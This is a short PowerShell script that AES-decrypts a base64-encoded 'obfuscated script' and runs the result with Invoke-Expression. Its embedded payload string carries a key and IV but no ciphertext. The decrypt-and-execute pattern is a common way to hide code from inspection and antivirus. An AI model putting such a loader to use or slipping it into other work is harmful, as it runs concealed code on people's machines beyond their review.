function Custom-Deobfuscate {
    param([string]$obfuscatedScript)

    try {
        $parts = $obfuscatedScript -split ','
        if ($parts.Count -ne 3) {
            throw "Invalid obfuscated script format"
        }

        $key = [Convert]::FromBase64String($parts[0])
        $iv = [Convert]::FromBase64String($parts[1])
        $encryptedData = [Convert]::FromBase64String($parts[2])

        $aes = New-Object System.Security.Cryptography.AesManaged
        $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
        $aes.Key = $key
        $aes.IV = $iv

        $decryptor = $aes.CreateDecryptor()
        $msDecrypt = New-Object System.IO.MemoryStream
        $csDecrypt = New-Object System.Security.Cryptography.CryptoStream($msDecrypt, $decryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)
        $csDecrypt.Write($encryptedData, 0, $encryptedData.Length)
        $csDecrypt.FlushFinalBlock()

        $decryptedBytes = $msDecrypt.ToArray()
        $decryptedScript = [System.Text.Encoding]::UTF8.GetString($decryptedBytes)

        return $decryptedScript
    }
    catch {
        Write-Error "Deobfuscation failed: $_"
        return $null
    }
    finally {
        if ($csDecrypt) { $csDecrypt.Dispose() }
        if ($msDecrypt) { $msDecrypt.Dispose() }
        if ($aes) { $aes.Dispose() }
    }
}

$obfuscatedScript = "Sig3zTb25wWJyikEPGTjhoejQo+VFSI4awkK5E8AHGA=,pmv/oZ9/WjruTXhNqYGfqA==,"
$deobfuscatedScript = Custom-Deobfuscate -obfuscatedScript $obfuscatedScript
if ($deobfuscatedScript) {
    Invoke-Expression $deobfuscatedScript
}
else {
    Write-Error "Failed to deobfuscate and execute the script."
}